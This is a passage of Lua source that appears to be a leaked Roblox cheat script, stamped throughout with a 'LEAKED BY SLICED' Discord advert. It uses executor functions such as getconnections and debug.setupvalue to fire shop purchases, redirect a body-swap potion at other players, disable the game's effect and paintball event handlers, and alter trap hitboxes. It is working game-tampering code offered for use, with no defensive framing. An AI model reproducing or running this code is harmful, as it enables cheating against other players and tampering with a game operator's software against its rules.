		local character_ = localPlayer.Character
		local backpack = localPlayer:FindFirstChildOfClass("Backpack")
		return character_ and character_:FindFirstChild(arg) or backpack and backpack:FindFirstChild(arg)
	end

	slicedfn5 = function(arg)
		local sliced12 = slicedfn4(arg)
		if sliced12 then
			return sliced12  -- LEAKED BY SLICED | discord.gg/pubmethod
		end
		local playerGui = localPlayer:FindFirstChildOfClass("PlayerGui")
		playerGui = playerGui and playerGui:FindFirstChild("CoinsShop")
		playerGui = playerGui and playerGui:FindFirstChild("CoinsShop")
		playerGui = playerGui and playerGui:FindFirstChild("Content")
		playerGui = playerGui and playerGui:FindFirstChild("Items")
		playerGui = playerGui and playerGui:FindFirstChild(arg)
		local locked = playerGui and playerGui:FindFirstChild("Locked")
		playerGui = playerGui and playerGui:FindFirstChild("Buy")
		if locked and locked.Visible then  -- LEAKED BY SLICED | discord.gg/pubmethod
			return nil, "rebirth"
		end

		if not playerGui then
			return nil, "unavailable"
		end
		local ok, result = pcall(getconnections, playerGui.Activated)
		if not ok or type(result) ~= "table" then
			return nil, "unavailable"
		end
		local flag2 = false  -- LEAKED BY SLICED | discord.gg/pubmethod

		for _, sliced13 in ipairs(result) do
			if sliced13.Enabled and type(sliced13.Fire) == "function" then
				if pcall(function()
					sliced13:Fire()
				end) then
					flag2 = true
					break
				end
			end
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		if not flag2 then
			return nil, "unavailable"
		end
		local now = os.clock()

		while true do
			local sliced13 = slicedfn4(arg)

			if sliced13 then
				return sliced13
			else
				RunService.Heartbeat:Wait()  -- LEAKED BY SLICED | discord.gg/pubmethod
				if not (n <= os.clock() - now) then
					continue
				end
				break
			end
		end

		return slicedfn4(arg), "cash"
	end

	local slicedfn6

	slicedfn6 = function(arg, arg2)  -- LEAKED BY SLICED | discord.gg/pubmethod
		local str

		if arg2 == "rebirth" then
			str = "A higher Rebirth level is required for " .. arg .. "."
		elseif arg2 == "cash" then
			str = "Not enough cash to buy " .. arg .. "."
		else
			str = "Unable to buy " .. arg .. " right now."
		end

		v.Notify("Tool unavailable", str, 5)
	end  -- LEAKED BY SLICED | discord.gg/pubmethod

	local slicedfn7
	local slicedn2 = 0

	slicedfn3 = function(arg)
		slicedn2 = math.max(slicedn2, os.clock() + (tonumber(arg) or 1))
	end

	slicedfn7 = function()
		return os.clock() < slicedn2
	end

	do
		local slicedn3 = 0.02  -- LEAKED BY SLICED | discord.gg/pubmethod
		local slicedn4 = 5
		local slicedn5 = 7
		local slicedn6 = 5
		local slicedn7 = 12
		local slicedn8 = 4
		local slicedn9 = 2
		local flag2 = false
		local flag3 = false
		local slicedn10 = 0
		local connection = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
		local connection2 = nil
		local connection3 = nil
		local sliced12 = nil
		local tbl3 = {}
		local slicedn11 = 0
		local slicedn12 = 0
		local sliced13 = nil
		local slicedfn8 = nil

		local function slicedfn9(arg)
			if not arg then  -- LEAKED BY SLICED | discord.gg/pubmethod
				return nil
			end
			local character_ = arg.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			character_ = character_ and character_:FindFirstChild("HumanoidRootPart")
			if humanoid and humanoid.Health > 0 and character_ then
				return character_
			end
			return nil
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		local function slicedfn10(arg)
			local sliced14 = nil
			local sliced15 = nil

			for _, player in ipairs(Players:GetPlayers()) do
				if player ~= localPlayer then
					local sliced16 = slicedfn9(player)

					if sliced16 then
						local magnitude = (sliced16.Position - arg.Position).Magnitude

						if not sliced14 or magnitude < sliced14 then
							sliced14 = magnitude  -- LEAKED BY SLICED | discord.gg/pubmethod
							sliced15 = player
						end
					end
				end
			end

			return sliced15
		end

		local function slicedfn11()
			local character_ = localPlayer.Character
			return character_ and character_:FindFirstChild("Body Swap Potion") or localPlayer.Backpack:FindFirstChild("Body Swap Potion")  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local function slicedfn12(arg, arg2)
			local ok, result = pcall(getconnections, arg.Activated)
			if not ok then
				return
			end

			for _, sliced14 in ipairs(result) do
				local function_ = nil

				pcall(function()
					function_ = sliced14.Function  -- LEAKED BY SLICED | discord.gg/pubmethod
				end)

				if typeof(function_) == "function" then
					local ok2, result2 = pcall(debug.getinfo, function_)
					ok2 = ok2 and result2

					if ok2 then
						ok2 = string.find(result2.source or "", "BodySwapScript", 1, true)
					end

					if ok2 then
						local slicedn13 = tonumber(result2.nups) or 0
						local flag4 = false  -- LEAKED BY SLICED | discord.gg/pubmethod

						for i_ = 1, slicedn13 do
							local ok3, result3, result4 = pcall(debug.getupvalue, function_, i_)
							local flag5 = string.find(string.lower(tostring(result3 or "")), "target", 1, true) ~= nil
							local flag6 = typeof(result4) == "Instance" and result4:IsA("Player") and result4 ~= localPlayer
							flag5 = flag5 and (result4 == nil or typeof(result4) == "Instance" and result4:IsA("Player"))

							if ok3 and (flag5 or flag6) then
								flag4 = pcall(debug.setupvalue, function_, i_, arg2) or flag4
							end
						end

						local flag5 = not flag4  -- LEAKED BY SLICED | discord.gg/pubmethod

						if flag5 then
							flag5 = (tonumber(result2.nups) or 0) >= 2
						end

						if flag5 then
							pcall(debug.setupvalue, function_, 2, arg2)
						end
					end
				end
			end
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		local function slicedfn13(arg)
			local tbl4 = {}

			for _, child in ipairs(arg:GetChildren()) do
				if child:IsA("Tool") then
					tbl4[#tbl4 + 1] = child
				end
			end

			return tbl4
		end

		local function slicedfn14(arg)  -- LEAKED BY SLICED | discord.gg/pubmethod
			if not arg then
				return
			end
			local sliced14 = arg.PreviousToolStates[1]
			local bodySwapTool = arg.BodySwapTool

			if bodySwapTool and bodySwapTool.Parent then
				pcall(function()
					bodySwapTool:Deactivate()
					bodySwapTool.Enabled = true
					bodySwapTool.Parent = localPlayer.Backpack  -- LEAKED BY SLICED | discord.gg/pubmethod
				end)
			end

			for _, previousToolState in ipairs(arg.PreviousToolStates) do
				pcall(function()
					if previousToolState.Tool.Parent then
						previousToolState.Tool.Enabled = previousToolState.Enabled

						if previousToolState.Tool.Parent == character then
							previousToolState.Tool.Parent = localPlayer.Backpack
						end
					end  -- LEAKED BY SLICED | discord.gg/pubmethod
				end)
			end

			local character_ = localPlayer.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			if not humanoid or humanoid.Health <= 0 then
				return
			end
			local tool = character_:FindFirstChildWhichIsA("Tool")

			if tool == bodySwapTool then
				pcall(function()  -- LEAKED BY SLICED | discord.gg/pubmethod
					bodySwapTool:Deactivate()
					bodySwapTool.Parent = localPlayer.Backpack
				end)

				tool = nil
			end

			if not tool and sliced14 and sliced14.Tool.Parent == localPlayer.Backpack then
				pcall(function()
					slicedfn3(0.5)
					humanoid:EquipTool(sliced14.Tool)
				end)  -- LEAKED BY SLICED | discord.gg/pubmethod
			end
		end

		local function slicedfn15()
			local character_ = localPlayer.Character
			local sliced14 = slicedfn11()
			if not sliced14 or not sliced14.Parent then
				return
			end

			pcall(function()
				sliced14:Deactivate()  -- LEAKED BY SLICED | discord.gg/pubmethod
				sliced14.Enabled = true

				if sliced14.Parent == character_ then
					sliced14.Parent = localPlayer.Backpack
				end
			end)
		end

		local function slicedfn16(arg)
			local character_ = localPlayer.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			local bodySwapPotion  -- LEAKED BY SLICED | discord.gg/pubmethod

			if character_ then
				bodySwapPotion = slicedfn11() or slicedfn5("Body Swap Potion")
			else
				bodySwapPotion = character_
			end

			if not character_ or not humanoid or not bodySwapPotion then
				return nil
			end
			slicedfn3(2)
			local tbl4 = {}  -- LEAKED BY SLICED | discord.gg/pubmethod

			for _, sliced14 in ipairs(slicedfn13(character_)) do
				if sliced14 ~= bodySwapPotion then
					tbl4[#tbl4 + 1] = { Tool = sliced14, Enabled = sliced14.Enabled }

					pcall(function()
						sliced14:Deactivate()
						sliced14.Enabled = false
						sliced14.Parent = localPlayer.Backpack
					end)
				end
			end  -- LEAKED BY SLICED | discord.gg/pubmethod

			humanoid:UnequipTools()
			slicedfn3(2)
			local slicedn13 = os.clock() + 0.45

			while true do
				pcall(function()
					humanoid:EquipTool(bodySwapPotion)
				end)

				if bodySwapPotion.Parent == character_ then
					break
				else  -- LEAKED BY SLICED | discord.gg/pubmethod
					task.wait(0.03)
					if not (slicedn13 <= os.clock()) then
						continue
					end
					break
				end
			end

			for _, sliced14 in ipairs(slicedfn13(character_)) do
				if sliced14 ~= bodySwapPotion then
					pcall(function()  -- LEAKED BY SLICED | discord.gg/pubmethod
						sliced14:Deactivate()
						sliced14.Parent = localPlayer.Backpack
					end)
				end
			end

			slicedfn12(bodySwapPotion, arg)

			return {
				Character = character_,
				Humanoid = humanoid,
				BodySwapTool = bodySwapPotion,  -- LEAKED BY SLICED | discord.gg/pubmethod
				PreviousToolStates = tbl4,
				StartedAt = os.clock(),
			}
		end

		local function slicedfn17(arg, arg2, arg3)
			if flag3 then
				return
			end
			flag3 = true
			local sliced14 = slicedn10  -- LEAKED BY SLICED | discord.gg/pubmethod

			task.spawn(function()
				local sliced15 = nil

				local ok = pcall(function()
					local slicedn13 = arg3 and slicedn7 + 3 or 12
					local slicedn14 = os.clock() + slicedn13
					local sliced16 = arg2

					while true do
						if flag2 and slicedn10 == sliced14 and os.clock() < slicedn14 then
							local sliced17 = slicedfn9(localPlayer)

							if not sliced17 then  -- LEAKED BY SLICED | discord.gg/pubmethod
								task.wait(0.08)
								continue
							elseif not ((sliced17.Position - arg).Magnitude <= slicedn6) then
								local flag4 = sliced15

								if sliced15 then
									local startedAt = sliced15.StartedAt
									flag4 = os.clock() - startedAt >= slicedn8
								end

								if not flag4 then
									if not sliced16 or not slicedfn9(sliced16) then  -- LEAKED BY SLICED | discord.gg/pubmethod
										sliced16 = slicedfn10(sliced17)
									end

									if not sliced16 then
										task.wait(0.08)
										continue
									else
										local character_, humanoid, bodySwapTool, tool

										if not sliced15 or localPlayer.Character ~= sliced15.Character or not sliced15.BodySwapTool.Parent then
											slicedfn14(sliced15)
											sliced13 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
											sliced15 = slicedfn16(sliced16)
											sliced13 = sliced15

											if not sliced15 then
												task.wait(0.12)
												continue
											else
												character_ = sliced15.Character
												humanoid = sliced15.Humanoid
												bodySwapTool = sliced15.BodySwapTool
												tool = character_:FindFirstChildWhichIsA("Tool")  -- LEAKED BY SLICED | discord.gg/pubmethod
												tool = tool and tool ~= bodySwapTool

												if not tool then
													if bodySwapTool.Parent ~= character_ then
														pcall(function()
															slicedfn3(1)
															humanoid:EquipTool(bodySwapTool)
														end)
													end

													if bodySwapTool.Parent == character_ then
														slicedfn12(bodySwapTool, sliced16)  -- LEAKED BY SLICED | discord.gg/pubmethod

														if bodySwapTool.Enabled ~= false then
															pcall(function()
																bodySwapTool:Deactivate()
																bodySwapTool:Activate()
															end)
														end
													end

													task.wait(0.08)
													continue
												end  -- LEAKED BY SLICED | discord.gg/pubmethod
											end
										else
											character_ = sliced15.Character
											humanoid = sliced15.Humanoid
											bodySwapTool = sliced15.BodySwapTool
											tool = character_:FindFirstChildWhichIsA("Tool")
											tool = tool and tool ~= bodySwapTool

											if not tool then
												if bodySwapTool.Parent ~= character_ then
													pcall(function()  -- LEAKED BY SLICED | discord.gg/pubmethod
														slicedfn3(1)
														humanoid:EquipTool(bodySwapTool)
													end)
												end

												if bodySwapTool.Parent == character_ then
													slicedfn12(bodySwapTool, sliced16)

													if bodySwapTool.Enabled ~= false then
														pcall(function()
															bodySwapTool:Deactivate()
															bodySwapTool:Activate()  -- LEAKED BY SLICED | discord.gg/pubmethod
														end)
													end
												end

												task.wait(0.08)
												continue
											end
										end
									end
								end
							end  -- LEAKED BY SLICED | discord.gg/pubmethod
						end

						break
					end
				end)

				slicedfn14(sliced15)

				if sliced13 == sliced15 then
					sliced13 = nil
				end

				slicedfn15()
				task.wait(0.2)  -- LEAKED BY SLICED | discord.gg/pubmethod

				if slicedn10 == sliced14 then
					flag3 = false

					if slicedfn8 then
						slicedfn8()
					end

					if not ok then
						slicedfn15()
					end
				end
			end)  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		slicedfn8 = function()
			sliced12 = nil
			table.clear(tbl3)
			slicedn11 = 0
		end

		local function slicedfn18(deltaTime)
			if localPlayer:GetAttribute("Stealing") == true then
				slicedn12 = os.clock() + slicedn9
			end  -- LEAKED BY SLICED | discord.gg/pubmethod

			slicedn11 += deltaTime
			if slicedn11 < slicedn3 then
				return
			end
			slicedn11 = 0
			local sliced14 = slicedfn9(localPlayer)
			if not sliced14 then
				slicedfn8()
				return
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
			local position = sliced14.Position

			if sliced12 and not flag3 then
				for _, player in ipairs(Players:GetPlayers()) do
					if player ~= localPlayer then
						local sliced15 = slicedfn9(player)
						local sliced16 = tbl3[player]

						if sliced15 and sliced16 then
							local position2 = sliced15.Position
							if (position - sliced12).Magnitude >= slicedn4 and (position2 - sliced16).Magnitude >= slicedn4 and (position - sliced16).Magnitude <= slicedn5 and (position2 - sliced12).Magnitude <= slicedn5 then
								slicedfn17(sliced12, player, localPlayer:GetAttribute("Stealing") == true or os.clock() <= slicedn12)  -- LEAKED BY SLICED | discord.gg/pubmethod
								break
							end
						end
					end
				end
			end

			sliced12 = position

			for _, player in ipairs(Players:GetPlayers()) do
				if player ~= localPlayer then
					local sliced15 = slicedfn9(player)  -- LEAKED BY SLICED | discord.gg/pubmethod
					tbl3[player] = sliced15 and sliced15.Position or nil
				end
			end
		end

		local function slicedfn19()
			local sliced14 = flag3
			local flag4

			if flag3 then
				flag4 = sliced14
			else  -- LEAKED BY SLICED | discord.gg/pubmethod
				flag4 = sliced13 ~= nil
			end

			local sliced15 = sliced13
			sliced13 = nil
			flag2 = false
			flag3 = false
			slicedn10 += 1
			slicedfn14(sliced15)

			if flag4 then
				slicedfn15()  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			slicedfn8()

			if connection then
				connection:Disconnect()
				connection = nil
			end

			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end  -- LEAKED BY SLICED | discord.gg/pubmethod

			if connection3 then
				connection3:Disconnect()
				connection3 = nil
			end
		end

		local function slicedfn20()
			slicedfn19()
			flag2 = true
			slicedfn8()
			local bodySwapPotion, sliced14 = slicedfn5("Body Swap Potion")  -- LEAKED BY SLICED | discord.gg/pubmethod

			if not bodySwapPotion then
				slicedfn6("Body Swap Potion", sliced14)
			end

			connection2 = localPlayer.CharacterAdded:Connect(function()
				slicedn10 += 1
				local sliced15 = sliced13
				sliced13 = nil
				slicedfn14(sliced15)
				flag3 = false
				slicedfn8()  -- LEAKED BY SLICED | discord.gg/pubmethod
				task.defer(slicedfn15)
			end)

			connection3 = localPlayer:GetAttributeChangedSignal("Stealing"):Connect(function()
				if localPlayer:GetAttribute("Stealing") == true then
					slicedn12 = os.clock() + slicedn9
				end
			end)

			if localPlayer:GetAttribute("Stealing") == true then
				slicedn12 = os.clock() + slicedn9
			end  -- LEAKED BY SLICED | discord.gg/pubmethod

			connection = RunService.Heartbeat:Connect(slicedfn18)
			return true
		end

		slicedfn2(slicedfn19)

		sliced10:CreateToggle({
			Name = "Anti Body Swap",
			Default = true,
			Callback = function(arg)
				if arg then
					slicedfn20()  -- LEAKED BY SLICED | discord.gg/pubmethod
				else
					slicedfn19()
				end
			end,
		})
	end

	do
		local flag2 = false
		local tbl3 = {}
		local tbl4 = {}  -- LEAKED BY SLICED | discord.gg/pubmethod
		local tbl5 = {}
		local obj2 = setmetatable({}, { __mode = "k" })
		local obj3 = setmetatable({}, { __mode = "k" })
		local obj4 = setmetatable({}, { __mode = "k" })
		local obj5 = setmetatable({}, { __mode = "k" })
		local obj6 = setmetatable({}, { __mode = "k" })
		local sliced12 = nil
		local moveFunction = nil
		local move = nil
		local moveFunction2 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
		local slicedn3 = 0
		local slicedn4 = 0
		local currentCamera = nil
		local humanoid = nil
		local flag3 = false
		local fieldOfView = 70
		local vector = Vector3.zero
		local tbl6 = { Blue = true, DiscoEffect = true, BeeBlur = true, ColorCorrection = true }
		local slicedfn8 = nil
		local slicedfn9 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod

		local function slicedfn10(arg)
			for _, sliced13 in ipairs(arg) do
				if typeof(sliced13) == "RBXScriptConnection" then
					sliced13:Disconnect()
				end
			end

			table.clear(arg)
		end

		local slicedfn11 = nil

		slicedfn11 = function(arg, arg2, arg3)  -- LEAKED BY SLICED | discord.gg/pubmethod
			if typeof(arg) ~= "function" or arg2 > 3 or arg3[arg] then
				return false
			end
			arg3[arg] = true
			local ok, result = pcall(debug.getconstants, arg)
			local flag4 = false
			local flag5 = false
			local flag6 = false

			if ok then
				for _, sliced13 in ipairs(result) do  -- LEAKED BY SLICED | discord.gg/pubmethod
					if type(sliced13) == "string" then
						local sliced14 = string.lower(sliced13)

						if string.find(sliced14, "discoeffect", 1, true) then
							flag5 = true
						end

						if string.find(sliced14, "boogie", 1, true) then
							flag4 = true
						end

						if sliced14 == "fieldofview" then
							flag6 = true  -- LEAKED BY SLICED | discord.gg/pubmethod
						end
					end
				end
			end

			if flag5 and (flag4 or flag6) then
				return true
			end
			local ok2, result2 = pcall(debug.getprotos, arg)

			if ok2 then
				for _, sliced13 in ipairs(result2) do  -- LEAKED BY SLICED | discord.gg/pubmethod
					if slicedfn11(sliced13, arg2 + 1, arg3) then
						return true
					end
				end
			end

			return false
		end

		local function slicedfn12(arg)
			local enabled = nil

			return pcall(function()  -- LEAKED BY SLICED | discord.gg/pubmethod
				enabled = arg.Enabled
			end) and enabled == true
		end

		local function slicedfn13(arg)
			if typeof(arg) ~= "function" then
				return false
			end
			local ok, result = pcall(debug.info, arg, "s")
			return ok and type(result) == "string" and string.find(string.lower(result), "paintballguncontroller", 1, true) ~= nil
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		local function slicedfn14(arg)
			if not flag2 or not flag then
				return
			end

			if slicedfn12(arg) then
				if pcall(function()
					arg:Disable()
				end) then
					obj5[arg] = true
				end  -- LEAKED BY SLICED | discord.gg/pubmethod
			end
		end

		local function slicedfn15(arg)
			if not flag2 or not flag or not arg or not arg.Parent or not arg:IsA("RemoteEvent") then
				return
			end
			local ok, result = pcall(getconnections, arg.OnClientEvent)

			if ok then
				for _, sliced13 in ipairs(result) do
					if not obj6[sliced13] then  -- LEAKED BY SLICED | discord.gg/pubmethod
						obj6[sliced13] = true
						local function_ = nil

						pcall(function()
							function_ = sliced13.Function
						end)

						if slicedfn11(function_, 1, {}) or slicedfn13(function_) then
							obj4[sliced13] = true
							slicedfn14(sliced13)
						end
					end  -- LEAKED BY SLICED | discord.gg/pubmethod
				end
			end
		end

		local function slicedfn16()
			slicedn4 += 1
			local sliced13 = slicedn4

			task.spawn(function()
				local tbl7 = { { Object = Lighting, Kind = "Lighting" }, { Object = ReplicatedStorage, Kind = "Remotes" } }
				local playerScripts = localPlayer:FindFirstChild("PlayerScripts")

				if playerScripts then  -- LEAKED BY SLICED | discord.gg/pubmethod
					tbl7[#tbl7 + 1] = { Object = playerScripts, Kind = "Sounds" }
				end

				local slicedn5 = 1

				while flag2 and flag and slicedn4 == sliced13 and slicedn5 <= #tbl7 do
					local now = os.clock()
					local slicedn6 = 0

					while true do
						local sliced14 = tbl7[slicedn5]
						slicedn5 += 1
						local object = sliced14.Object  -- LEAKED BY SLICED | discord.gg/pubmethod

						if object and object.Parent then
							if sliced14.Kind == "Lighting" then
								slicedfn8(object)
							elseif sliced14.Kind == "Sounds" then
								slicedfn9(object)
							elseif sliced14.Kind == "Remotes" and object:IsA("RemoteEvent") then
								slicedfn15(object)
							end

							local tbl8 = {}

							pcall(function()  -- LEAKED BY SLICED | discord.gg/pubmethod
								tbl8 = object:GetChildren()
							end)

							for _, sliced15 in ipairs(tbl8) do
								tbl7[#tbl7 + 1] = { Object = sliced15, Kind = sliced14.Kind }
							end
						end

						slicedn6 += 1
						if not (slicedn5 > #tbl7 or slicedn6 >= 20 or os.clock() - now >= 0.0015) then
							continue
						end  -- LEAKED BY SLICED | discord.gg/pubmethod
						break
					end

					if slicedn5 <= #tbl7 then
						RunService.Heartbeat:Wait()
					end
				end
			end)
		end

		local function slicedfn17()
			for k in pairs(obj5) do  -- LEAKED BY SLICED | discord.gg/pubmethod
				pcall(function()
					if not k.Enabled then
						k:Enable()
					end
				end)
			end

			table.clear(obj5)
			table.clear(obj4)
			table.clear(obj6)
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		slicedfn8 = function(arg)
			if arg and arg.Parent and tbl6[arg.Name] then
				pcall(function()
					arg:Destroy()
				end)
			end
		end

		local function slicedfn18()
			return localPlayer:GetAttribute("ChilliTpMoving") == true or localPlayer:GetAttribute("Teleporting") == true
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		slicedfn9 = function(arg)
			if not arg or not arg:IsA("Sound") or arg.Name ~= "Buzzing" then
				return
			end

			if obj3[arg] == nil then
				obj3[arg] = arg.Volume
			end

			local flag4 = false

			local function slicedfn19()
				if flag4 or not flag2 or not arg.Parent then  -- LEAKED BY SLICED | discord.gg/pubmethod
					return
				end
				flag4 = true

				pcall(function()
					if arg.Playing then
						arg:Stop()
					end

					if arg.Volume ~= 0 then
						arg.Volume = 0
					end  -- LEAKED BY SLICED | discord.gg/pubmethod
				end)

				flag4 = false
			end

			slicedfn19()
			if obj2[arg] then
				return
			end
			obj2[arg] = true
			tbl4[#tbl4 + 1] = arg:GetPropertyChangedSignal("Volume"):Connect(slicedfn19)
			tbl4[#tbl4 + 1] = arg:GetPropertyChangedSignal("Playing"):Connect(slicedfn19)  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local function slicedfn19()
			if flag3 or not flag2 then
				return
			end
			flag3 = true

			pcall(function()
				if currentCamera and currentCamera.Parent and currentCamera.FieldOfView ~= fieldOfView then
					currentCamera.FieldOfView = fieldOfView
				end  -- LEAKED BY SLICED | discord.gg/pubmethod

				if humanoid and humanoid.Parent and humanoid.CameraOffset ~= vector then
					humanoid.CameraOffset = vector
				end
			end)

			flag3 = false
		end

		local function slicedfn20()
			slicedfn10(tbl5)
			currentCamera = Workspace.CurrentCamera
			local character_ = localPlayer.Character  -- LEAKED BY SLICED | discord.gg/pubmethod
			humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			slicedfn19()

			if currentCamera then
				tbl5[#tbl5 + 1] = currentCamera:GetPropertyChangedSignal("FieldOfView"):Connect(slicedfn19)
			end

			if humanoid then
				tbl5[#tbl5 + 1] = humanoid:GetPropertyChangedSignal("CameraOffset"):Connect(slicedfn19)
			end
		end

		local function slicedfn21()  -- LEAKED BY SLICED | discord.gg/pubmethod
			slicedfn10(tbl5)
			currentCamera = nil
			humanoid = nil
			flag3 = false
		end

		local function slicedfn22()
			if sliced12 then
				pcall(function()
					sliced12.moveFunction = move or moveFunction
				end)  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			sliced12 = nil
			moveFunction = nil
			move = nil
			moveFunction2 = nil
		end

		local function slicedfn23()
			if sliced12 and moveFunction2 then
				if sliced12.moveFunction ~= moveFunction2 then
					sliced12.moveFunction = moveFunction2  -- LEAKED BY SLICED | discord.gg/pubmethod
				end

				return
			end

			pcall(function()
				local playerScripts = localPlayer:FindFirstChild("PlayerScripts")
				playerScripts = playerScripts and playerScripts:FindFirstChild("PlayerModule")
				if not playerScripts then
					return
				end
				local controls = require(playerScripts):GetControls()  -- LEAKED BY SLICED | discord.gg/pubmethod
				if not controls then
					return
				end
				sliced12 = controls
				moveFunction = controls.moveFunction
				move = localPlayer.Move

				moveFunction2 = function(arg, arg2, arg3)
					return localPlayer:Move(arg2, arg3)
				end

				sliced12.moveFunction = moveFunction2  -- LEAKED BY SLICED | discord.gg/pubmethod
			end)
		end

		local function slicedfn24()
			slicedfn10(tbl4)

			for k, sliced13 in pairs(obj3) do
				if k and k.Parent then
					pcall(function()
						k.Volume = sliced13
					end)
				end  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			table.clear(obj2)
			table.clear(obj3)
		end

		local function slicedfn25()
			flag2 = false
			slicedn3 += 1
			slicedn4 += 1
			slicedfn10(tbl3)
			slicedfn17()  -- LEAKED BY SLICED | discord.gg/pubmethod
			slicedfn21()
			slicedfn22()
			slicedfn24()
		end

		local function slicedfn26()
			slicedfn25()
			flag2 = true
			slicedn3 += 1
			local sliced13 = slicedn3
			slicedfn23()  -- LEAKED BY SLICED | discord.gg/pubmethod
			slicedfn20()
			slicedfn16()

			tbl3[#tbl3 + 1] = Lighting.DescendantAdded:Connect(function(descendant)
				if flag2 then
					slicedfn8(descendant)
				end
			end)

			tbl3[#tbl3 + 1] = ReplicatedStorage.DescendantAdded:Connect(function(descendant)
				if flag2 and descendant:IsA("RemoteEvent") then
					task.defer(function()  -- LEAKED BY SLICED | discord.gg/pubmethod
						slicedfn15(descendant)
					end)

					task.delay(0.5, function()
						slicedfn15(descendant)
					end)
				end
			end)

			local playerScripts = localPlayer:FindFirstChild("PlayerScripts")

			if playerScripts then
				tbl3[#tbl3 + 1] = playerScripts.DescendantAdded:Connect(function(descendant)  -- LEAKED BY SLICED | discord.gg/pubmethod
					if flag2 then
						slicedfn9(descendant)
					end
				end)
			end

			tbl3[#tbl3 + 1] = Workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
				if flag2 then
					slicedfn20()
				end
			end)  -- LEAKED BY SLICED | discord.gg/pubmethod

			tbl3[#tbl3 + 1] = localPlayer.CharacterAdded:Connect(function(character_)
				task.spawn(function()
					character_:WaitForChild("Humanoid", 5)

					if flag2 and character_ == localPlayer.Character then
						slicedfn20()
					end
				end)
			end)

			task.spawn(function()
				while true do  -- LEAKED BY SLICED | discord.gg/pubmethod
					if flag2 and flag and slicedn3 == sliced13 then
						task.wait(0.1)

						if not (not flag2 or not flag or slicedn3 ~= sliced13) then
							if not slicedfn18() then
								slicedfn23()
							end

							continue
						end
					end

					break  -- LEAKED BY SLICED | discord.gg/pubmethod
				end
			end)
		end

		slicedfn2(slicedfn25)

		sliced10:CreateToggle({
			Name = "Anti Bee, Disco & Paintball Effect",
			Default = true,
			Callback = function(arg)
				if arg then
					slicedfn26()  -- LEAKED BY SLICED | discord.gg/pubmethod
				else
					slicedfn25()
				end
			end,
		})
	end

	do
		local slicedn3 = 1.06
		local vector = Vector3.new(2.9, 1.15, 2.9)
		local color = Color3.fromRGB(255, 45, 45)  -- LEAKED BY SLICED | discord.gg/pubmethod
		local lineThickness = 0.03
		local flag2 = false
		local connection = nil
		local connection2 = nil
		local tbl3 = {}

		local function slicedfn8(arg)
			return arg:IsA("Model") and arg.Name:match("^Trap") ~= nil
		end

		local function slicedfn9(arg, arg2)
			local sliced12 = arg:FindFirstChild(arg2)  -- LEAKED BY SLICED | discord.gg/pubmethod
			if sliced12 and sliced12:IsA("BasePart") then
				return sliced12
			end

			for _, descendant in ipairs(arg:GetDescendants()) do
				if descendant.Name == arg2 and descendant:IsA("BasePart") then
					return descendant
				end
			end

			return nil
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		local function slicedfn10(arg)
			local sliced12 = tbl3[arg]
			if not sliced12 then
				return
			end
			tbl3[arg] = nil

			if sliced12.Connection then
				pcall(function()
					sliced12.Connection:Disconnect()
				end)  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			for _, propertyConnection in ipairs(sliced12.PropertyConnections) do
				pcall(function()
					propertyConnection:Disconnect()
				end)
			end

			table.clear(sliced12.PropertyConnections)

			if sliced12.Outline then
				pcall(function()
					sliced12.Outline:Destroy()  -- LEAKED BY SLICED | discord.gg/pubmethod
				end)
			end

			if sliced12.Target and sliced12.Target.Parent then
				pcall(function()
					sliced12.Target.Size = sliced12.OriginalSize
					sliced12.Target.CFrame = sliced12.OriginalCFrame
					sliced12.Target.CanCollide = sliced12.OriginalCanCollide
					sliced12.Target.CanTouch = sliced12.OriginalCanTouch
				end)
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local function slicedfn11()
			for k in pairs(tbl3) do
				slicedfn10(k)
			end

			table.clear(tbl3)
		end

		local function slicedfn12(arg, arg2)
			local character_ = localPlayer.Character
			character_ = character_ and character_:FindFirstChild("HumanoidRootPart")  -- LEAKED BY SLICED | discord.gg/pubmethod
			if not character_ then
				return false
			end
			local sliced12 = arg:PointToObjectSpace(character_.Position)
			local slicedn4 = arg2 * 0.5
			local x = slicedn4.X
			local flag3 = math.abs(sliced12.X) <= x

			if flag3 then
				local y = slicedn4.Y
				flag3 = math.abs(sliced12.Y) <= y  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			if flag3 then
				local z = slicedn4.Z
				flag3 = math.abs(sliced12.Z) <= z
			end

			return flag3
		end

		local function slicedfn13(arg)
			if not flag2 or tbl3[arg] then
				return  -- LEAKED BY SLICED | discord.gg/pubmethod
			end
			local open = slicedfn9(arg, "Open")
			local close = slicedfn9(arg, "Close")
			if not open or not close then
				return
			end
			local boundingBox, sliced12 = arg:GetBoundingBox()
			local slicedn4 = sliced12 * slicedn3 + vector
			local slicedn5 = math.max(slicedn4.X, slicedn4.Z)
			local vector2 = Vector3.new(slicedn5, slicedn4.Y, slicedn5)  -- LEAKED BY SLICED | discord.gg/pubmethod
			if slicedfn12(open.CFrame, vector2) then
				return
			end

			local tbl4 = {
				Target = close,
				OriginalSize = close.Size,
				OriginalCFrame = close.CFrame,
				OriginalCanCollide = close.CanCollide,
				OriginalCanTouch = close.CanTouch,
				PropertyConnections = {},  -- LEAKED BY SLICED | discord.gg/pubmethod
			}

			tbl3[arg] = tbl4
			local flag3 = false

